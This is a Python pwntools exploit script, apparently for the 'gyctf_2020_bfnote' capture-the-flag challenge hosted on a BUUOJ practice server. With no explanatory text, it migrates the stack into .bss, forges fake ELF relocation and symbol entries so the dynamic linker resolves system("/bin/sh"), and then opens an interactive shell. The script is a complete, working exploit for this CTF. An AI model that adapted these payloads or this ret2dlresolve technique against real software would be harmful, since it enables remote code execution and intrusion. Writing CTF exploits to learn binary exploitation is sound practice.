from pwn import *

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/32/libc-2.23.debug.so
    ''' + s)

def exp(isRmote):
    #debug('b *0x08048962')

    bss = 0x804A060
    gap = 0x500
    payload = b'a' * (0x3e - 0xc + 0x8) + p64(bss + gap + 0x4)
    sa(b'Give your description : ', payload) #stack migrate

    strtab = 0x80482C8
    symtab = 0x80481D8
    plt0 = 0x08048450
    jmprel = 0x080483D0
                            #str_offset
    fake_sym = p32(bss + gap + 0x18 - strtab) + p32(0) + p32(0) + p32(0x12)
                    #num index of symtab                      type
    r_info = int((bss + gap + 0x28 - symtab) / 0x10) * 0x100 + 7
                #ret
    fake_rel = p32(bss) + p32(r_info)
    fake_stack = b'\x00' * gap + p32(plt0)
    fake_stack += p32(bss + gap + 0x20 - jmprel) + p32(2)
    fake_stack += p32(bss + gap + 0x10)
    fake_stack += b'/bin/sh\x00' + b'system\x00\x00' + fake_rel + fake_sym
    sa(b'Give your postscript : ', fake_stack)

    sa(b'Give your notebook size : ', b'131072')

    if isRmote:
        sa(b'Give your title size : ', str(0xf7d1a714 - 0xf7cf9008 - 16).encode())
    else:
        sa(b'Give your title size : ', str(0xf7ffb954 - 0xf7dfa008 - 16).encode())
    sa(b'invalid ! please re-enter :\n', b'4')

    sa(b'Give your title : ', b'a')
    sa(b'Give your note : ', b'aaaa')
    
    p.interactive()

context.log_level = 'debug'
#p = process('./gyctf_2020_bfnote')
p = remote('node4.buuoj.cn', 26455)
exp(True)